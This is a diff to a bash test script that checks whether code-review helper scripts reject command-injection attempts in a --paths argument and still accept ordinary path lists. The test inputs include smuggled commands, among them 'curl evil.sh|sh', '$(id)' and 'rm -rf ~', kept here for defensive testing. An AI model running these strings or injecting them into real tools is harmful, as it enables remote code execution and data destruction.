@@ -12,26 +12,23 @@
 set -uo pipefail
 TREE="$(cd -- "$(dirname -- "$0")/.." && pwd)"
 TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
-mkdir -p "$TMP/bin"; printf '#!/usr/bin/env bash\nexit 0\n' > "$TMP/bin/codex"; cp "$TMP/bin/codex" "$TMP/bin/opencode"; chmod +x "$TMP/bin/"*
-export PATH="$TMP/bin:$PATH" MULTI_HOME="$TMP/h"
+export MULTI_HOME="$TMP/h"
 fail=0
 say(){ if [ "$2" = "$3" ]; then echo "  ok   $1"; else echo "  FAIL $1: got '$2' want '$3'"; fail=1; fi; }
 
 echo "== injected path lists must be refused =="
 for bad in 'src/a.py; curl evil.sh|sh' 'a $(id)' 'a `id`' 'a && rm -rf ~' 'a > /etc/x'; do
-  bash "$TREE/scripts/review-codex.sh" --target t --out "$TMP/o.txt" --paths "$bad" >/dev/null 2>&1
+  bash "$TREE/scripts/review-prompt.sh" --target t --paths "$bad" >/dev/null 2>&1
   say "refused: $bad" "$?" "2"
 done
 
 echo "== ordinary path lists must still work =="
 for good in 'src/app.py' 'src/a.py src/b.py' 'src/**/*.py' 'a-b_c/d.e.py'; do
-  bash "$TREE/scripts/review-codex.sh" --target t --out "$TMP/o.txt" --paths "$good" >/dev/null 2>&1
+  bash "$TREE/scripts/review-prompt.sh" --target t --paths "$good" >/dev/null 2>&1
   rc=$?; say "accepted: $good" "$([ $rc -eq 2 ] && echo refused || echo ok)" "ok"
 done
 
-echo "== the other two entry points guard it too =="
-bash "$TREE/scripts/review-opencode.sh" --target t --model m --out "$TMP/o.txt" --paths 'a; id' >/dev/null 2>&1
-say "review-opencode refuses" "$?" "2"
+echo "== collect-context guards it too =="
 if command -v git >/dev/null 2>&1; then
   ( cd "$TMP" && git init -q . && bash "$TREE/scripts/collect-context.sh" --paths 'a; id' >/dev/null 2>&1 )
   say "collect-context refuses" "$?" "2"
